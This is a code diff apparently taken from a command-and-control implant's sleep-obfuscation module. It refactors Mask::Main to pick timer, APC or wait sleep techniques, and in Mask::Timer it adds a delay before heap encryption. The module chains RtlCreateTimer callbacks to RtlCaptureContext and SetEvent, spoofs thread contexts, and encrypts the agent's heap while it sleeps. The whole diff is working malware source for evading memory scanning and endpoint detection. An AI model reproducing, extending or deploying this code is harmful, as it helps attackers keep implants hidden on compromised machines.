@@ -5,7 +5,9 @@ using namespace Root;
 auto DECLFN Mask::Main(
     _In_ ULONG Time
 ) -> BOOL {
-    
+    KhDbg( "[====== Starting the sleep ======]" );
+
+    BOOL  Success = FALSE;
     ULONG RndTime = 0;
     
     if ( Self->Session.Jitter ) {
@@ -19,16 +21,20 @@ auto DECLFN Mask::Main(
         RndTime = Self->Session.SleepTime;
     }
 
-    KhDbg( "sleep during: %d", RndTime );
+    KhDbg( "sleep during: %d seconds", RndTime % 1000 );
 
     switch( Self->Mk->Ctx.TechniqueID ) {
     case MaskTimer:
-        return Self->Mk->Timer( RndTime );
+        Success = Self->Mk->Timer( RndTime ); break;
     case MaskApc:
-        return Self->Mk->Apc( RndTime );
+        Success = Self->Mk->Apc( RndTime ); break;
     case MaskWait:
-        return Self->Mk->Wait( RndTime );
+        Success = Self->Mk->Wait( RndTime ); break;
     }
+
+    KhDbg( "[====== Exiting Sleep ======]\n" );
+
+    return Success;
 }
 
 auto DECLFN Mask::FindGadget(
@@ -96,11 +102,11 @@ auto DECLFN Mask::Timer(
 
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Ntdll.RtlCaptureContext, &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
-
+    
     NtStatus = Self->Ntdll.RtlCreateTimer( Queue, &Timer, (WAITORTIMERCALLBACKFUNC)Self->Krnl32.SetEvent, EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
-    NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL ); 
+    NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
     CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;
@@ -182,17 +188,18 @@ auto DECLFN Mask::Timer(
     }
 
     if ( Self->Hp->Obfuscate ) {
-        KhDbg( "obfuscating heap allocation from agent" );
+        KhDbg( "obfuscating heap allocations from agent" );
+        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
         Self->Hp->Crypt();
     }
 
-    KhDbg( "trigger obf chain\n\n" );
+    KhDbg( "trigger obf chain" );
 
     NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, NULL );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
     if ( Self->Hp->Obfuscate ) {
-        KhDbg( "deobfuscating heap allocation from agent" );
+        KhDbg( "deobfuscating heap allocations from agent" );
         Self->Hp->Crypt();
     }
 
